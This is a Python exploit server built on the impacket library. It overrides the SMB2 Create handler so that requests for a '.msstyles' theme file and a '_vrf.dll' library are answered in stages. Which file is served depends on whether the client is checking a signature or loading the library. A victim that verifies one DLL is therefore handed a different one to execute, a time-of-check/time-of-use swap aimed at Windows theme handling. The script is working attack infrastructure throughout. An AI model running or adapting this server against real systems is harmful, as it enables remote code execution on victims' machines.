import socket
import logging
import logging.config
import os
import sys
from six import b, ensure_str

# For signing
from impacket import smb, uuid, smbserver
from impacket import smb3structs as smb2
from impacket.nt_errors import STATUS_FILE_IS_A_DIRECTORY, STATUS_OBJECT_NAME_COLLISION, \
    STATUS_NO_SUCH_FILE,  STATUS_SUCCESS, STATUS_ACCESS_DENIED, STATUS_OBJECT_PATH_SYNTAX_BAD

# Setting LOG to current's module name
LOG = logging.getLogger(__name__)

# These ones not defined in nt_errors
STATUS_SMB_BAD_UID = 0x005B0002
STATUS_SMB_BAD_TID = 0x00050002

@staticmethod
def overrideSmb2Create(connId, smbServer, recvPacket):
        connData = smbServer.getConnectionData(connId)

        respSMBCommand = smb2.SMB2Create_Response()

        ntCreateRequest = smb2.SMB2Create(recvPacket['Data'])
    
        respSMBCommand['Buffer'] = b'\x00'
        # Get the Tid associated
        if recvPacket['TreeID'] in connData['ConnectedShares']:
            # If we have a rootFid, the path is relative to that fid
            errorCode = STATUS_SUCCESS
            if 'path' in connData['ConnectedShares'][recvPacket['TreeID']]:
                path = connData['ConnectedShares'][recvPacket['TreeID']]['path']
            else:
                path = 'NONE'
                errorCode = STATUS_ACCESS_DENIED

            deleteOnClose = False

            fileName = smbserver.normalize_path(ntCreateRequest['Buffer'][:ntCreateRequest['NameLength']].decode('utf-16le'))
            
            if fileName.endswith(".msstyles"):
                print("Client requested stage 1 - Version Check")
                fileName = "stage_1"
            elif fileName.endswith("_vrf.dll"):
                if ntCreateRequest['ShareAccess'] != 5:
                    print("Client requested stage 2 - Verify Signature")
                    fileName = "stage_2"
                else:
                    print("Client has requested stage 3 - Load library")
                    fileName = "stage_3"


            if not smbserver.isInFileJail(path, fileName):
                LOG.error("Path not in current working directory")
                return [smb2.SMB2Error()], None, STATUS_OBJECT_PATH_SYNTAX_BAD

            pathName = os.path.join(path, fileName)
            createDisposition = ntCreateRequest['CreateDisposition']
            mode = 0

            if createDisposition == smb2.FILE_SUPERSEDE:
                mode |= os.O_TRUNC | os.O_CREAT
            elif createDisposition & smb2.FILE_OVERWRITE_IF == smb2.FILE_OVERWRITE_IF:
                mode |= os.O_TRUNC | os.O_CREAT
            elif createDisposition & smb2.FILE_OVERWRITE == smb2.FILE_OVERWRITE:
                if os.path.exists(pathName) is True:
                    mode |= os.O_TRUNC
                else:
                    errorCode = STATUS_NO_SUCH_FILE
            elif createDisposition & smb2.FILE_OPEN_IF == smb2.FILE_OPEN_IF:
                mode |= os.O_CREAT
            elif createDisposition & smb2.FILE_CREATE == smb2.FILE_CREATE:
                if os.path.exists(pathName) is True:
                    errorCode = STATUS_OBJECT_NAME_COLLISION
                else:
                    mode |= os.O_CREAT
            elif createDisposition & smb2.FILE_OPEN == smb2.FILE_OPEN:
                if os.path.exists(pathName) is not True and (
                        str(pathName) in smbServer.getRegisteredNamedPipes()) is not True:
                    errorCode = STATUS_NO_SUCH_FILE

            if errorCode == STATUS_SUCCESS:
                desiredAccess = ntCreateRequest['DesiredAccess']
                if (desiredAccess & smb2.FILE_READ_DATA) or (desiredAccess & smb2.GENERIC_READ):
                    mode |= os.O_RDONLY
                if (desiredAccess & smb2.FILE_WRITE_DATA) or (desiredAccess & smb2.GENERIC_WRITE):
                    if (desiredAccess & smb2.FILE_READ_DATA) or (desiredAccess & smb2.GENERIC_READ):
                        mode |= os.O_RDWR  # | os.O_APPEND
                    else:
                        mode |= os.O_WRONLY  # | os.O_APPEND
                if desiredAccess & smb2.GENERIC_ALL:
                    mode |= os.O_RDWR  # | os.O_APPEND
                createOptions = ntCreateRequest['CreateOptions']
                if mode & os.O_CREAT == os.O_CREAT:
                    if createOptions & smb2.FILE_DIRECTORY_FILE == smb2.FILE_DIRECTORY_FILE:
                        try:
                            # Let's create the directory
                            os.mkdir(pathName)
                            mode = os.O_RDONLY
                        except Exception as e:
                            smbServer.log("SMB2_CREATE: %s,%s,%s" % (pathName, mode, e), logging.ERROR)
                            errorCode = STATUS_ACCESS_DENIED
                if createOptions & smb2.FILE_NON_DIRECTORY_FILE == smb2.FILE_NON_DIRECTORY_FILE:
                    # If the file being opened is a directory, the server MUST fail the request with
                    # STATUS_FILE_IS_A_DIRECTORY in the Status field of the SMB Header in the server
                    # response.
                    if os.path.isdir(pathName) is True:
                        errorCode = STATUS_FILE_IS_A_DIRECTORY

                if createOptions & smb2.FILE_DELETE_ON_CLOSE == smb2.FILE_DELETE_ON_CLOSE:
                    deleteOnClose = True

                if errorCode == STATUS_SUCCESS:
                    try:
                        if os.path.isdir(pathName) and sys.platform == 'win32':
                            fid = VOID_FILE_DESCRIPTOR
                        else:
                            if sys.platform == 'win32':
                                mode |= os.O_BINARY
                            if ensure_str(pathName) in smbServer.getRegisteredNamedPipes():
                                fid = smbserver.PIPE_FILE_DESCRIPTOR
                                sock = socket.socket()
                                sock.connect(smbServer.getRegisteredNamedPipes()[ensure_str(pathName)])
                            else:
                                fid = os.open(pathName, mode)
                    except Exception as e:
                        smbServer.log("SMB2_CREATE: %s,%s,%s" % (pathName, mode, e), logging.ERROR)
                        # print e
                        fid = 0
                        errorCode = STATUS_ACCESS_DENIED
        else:
            errorCode = STATUS_SMB_BAD_TID

        if errorCode == STATUS_SUCCESS:
            # Simple way to generate a fid
            fakefid = uuid.generate()

            respSMBCommand['FileID'] = fakefid
            respSMBCommand['CreateAction'] = createDisposition

            if fid == smbserver.PIPE_FILE_DESCRIPTOR:
                respSMBCommand['CreationTime'] = 0
                respSMBCommand['LastAccessTime'] = 0
                respSMBCommand['LastWriteTime'] = 0
                respSMBCommand['ChangeTime'] = 0
                respSMBCommand['AllocationSize'] = 4096
                respSMBCommand['EndOfFile'] = 0
                respSMBCommand['FileAttributes'] = 0x80

            else:
                if os.path.isdir(pathName):
                    respSMBCommand['FileAttributes'] = smb.SMB_FILE_ATTRIBUTE_DIRECTORY
                else:
                    respSMBCommand['FileAttributes'] = ntCreateRequest['FileAttributes']
                # Let's get this file's information
                respInfo, errorCode = smbserver.queryPathInformation(path, fileName, level=smb.SMB_QUERY_FILE_ALL_INFO)
                if errorCode == STATUS_SUCCESS:
                    respSMBCommand['CreationTime'] = respInfo['CreationTime']
                    respSMBCommand['LastAccessTime'] = respInfo['LastAccessTime']
                    respSMBCommand['LastWriteTime'] = respInfo['LastWriteTime']
                    respSMBCommand['LastChangeTime'] = respInfo['LastChangeTime']
                    respSMBCommand['FileAttributes'] = respInfo['ExtFileAttributes']
                    respSMBCommand['AllocationSize'] = respInfo['AllocationSize']
                    respSMBCommand['EndOfFile'] = respInfo['EndOfFile']

            if errorCode == STATUS_SUCCESS:
                # Let's store the fid for the connection
                # smbServer.log('Create file %s, mode:0x%x' % (pathName, mode))
                connData['OpenedFiles'][fakefid] = {}
                connData['OpenedFiles'][fakefid]['FileHandle'] = fid
                connData['OpenedFiles'][fakefid]['FileName'] = pathName
                connData['OpenedFiles'][fakefid]['DeleteOnClose'] = deleteOnClose
                connData['OpenedFiles'][fakefid]['Open'] = {}
                connData['OpenedFiles'][fakefid]['Open']['EnumerationLocation'] = 0
                connData['OpenedFiles'][fakefid]['Open']['EnumerationSearchPattern'] = ''
                if fid == smbserver.PIPE_FILE_DESCRIPTOR:
                    connData['OpenedFiles'][fakefid]['Socket'] = sock
        else:
            respSMBCommand = smb2.SMB2Error()

        if errorCode == STATUS_SUCCESS:
            connData['LastRequest']['SMB2_CREATE'] = respSMBCommand

        smbServer.setConnectionData(connId, connData)

        return [respSMBCommand], None, errorCode

if __name__ == '__main__':
    smbserver.SMB2Commands.smb2Create = overrideSmb2Create
    server = smbserver.SimpleSMBServer(listenAddress="0.0.0.0", listenPort=int(445))
    
    logging.getLogger().setLevel(logging.DEBUG)
    server.addShare("share", os.getcwd())
    server.setSMB2Support(True)
    server.setLogFile('')
    server.start()